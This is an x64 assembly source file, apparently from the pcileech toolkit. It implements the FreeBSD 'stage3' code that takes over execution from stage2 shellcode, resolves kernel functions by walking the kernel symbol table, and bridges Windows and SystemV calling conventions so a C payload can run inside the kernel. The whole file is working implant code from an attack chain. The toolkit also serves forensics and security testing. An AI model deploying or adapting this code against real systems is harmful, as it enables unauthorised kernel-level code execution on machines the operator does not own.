; fbsdx64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with FreeBSD x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS wx64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	ENTER 20h, 0
	CALL stage3_c_EntryPoint
	LEAVE
	; ----------------------------------------------------
	; 3: RESTORE AND JMP BACK
	; ----------------------------------------------------
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN BSD KERNEL
; destroyed registers :: rsi
; rcx -> PKMDDATA
; rdx -> rdi -> ptr to symbol/function str
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionBSD PROC
	PUSH rdi
	PUSH rsi
	MOV rdi, rdx
	MOV rcx, [rcx+58h]			; [PKMDDATA->ReservedKMD]
	MOV rdx, rcx				; [PKMDDATA->ReservedKMD]
	SUB rcx, 8
	loop_symsearch:
	SUB rcx, 18h
	MOV rax, [rcx]
	TEST rax, rax
	JZ error
	MOV esi, [rcx]
	ADD rsi, rdx
	CALL strcmp_simple
	TEST rax, rax
	JNZ loop_symsearch
	MOV rax, [rcx+8]
	POP rsi
	POP rdi
	RET
	error:
	XOR rax, rax
	POP rsi
	POP rdi
	RET
LookupFunctionBSD ENDP

; ----------------------------------------------------
; Lookup functions in the FreeBSD kernel image.
; This function is called by the c-code.
; rcx = PKMDDATA
; rdx = ptr to FNBSD struct
; rax <- TRUE(1)/FALSE(0)
; ----------------------------------------------------
LookupFunctionsDefaultFreeBSD PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	PUSH r12
	MOV r12, rsp
	MOV r15, rcx				; PKMDDATA
	MOV r14, rdx				; PFNBSD
	MOV r13, 7*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_dump_avail
	PUSH rax
	LEA rax, str_kthread_exit
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_memset
	PUSH rax
	LEA rax, str_pause_sbt
	PUSH rax
	LEA rax, str_vm_phys_alloc_contig
	PUSH rax
	LEA rax, str_vm_phys_free_contig
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15				; PKMDDATA
	POP rdx
	CALL LookupFunctionBSD
	TEST rax, rax
	JZ lookup_fail
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	MOV rax, 1
	JMP cleanup_return
	lookup_fail:
	XOR rax, rax
	cleanup_return:
	MOV rsp, r12
	POP r12
	POP r13
	POP r14
	POP r15
	RET
LookupFunctionsDefaultFreeBSD ENDP

str_dump_avail					db 'dump_avail', 0
str_kthread_exit				db 'kthread_exit', 0
str_memcpy						db 'memcpy', 0
str_memset						db 'memset', 0
str_pause_sbt					db 'pause_sbt', 0
str_vm_phys_alloc_contig		db 'vm_phys_alloc_contig', 0
str_vm_phys_free_contig			db 'vm_phys_free_contig', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of ten (10)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	PUSH r14
	PUSH r15
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+4*8+00h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+4*8+08h]
	MOV r9,  [rsp+28h+4*8+10h]
	MOV r15, rsp
	MOV r14, [rsp+28h+4*8+30h] ; 20h stack shadow space + 8h (RET) + 3*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+5*8+28h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+6*8+20h] ; 20h stack shadow space + 8h (RET) + 5*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+7*8+18h] ; 20h stack shadow space + 8h (RET) + 6*8h PUSH + xxh offset
	PUSH r14
	CALL rax
	MOV rsp, r15
	POP r15
	POP r14
	POP rsi
	POP rdi
	RET
SysVCall ENDP

END
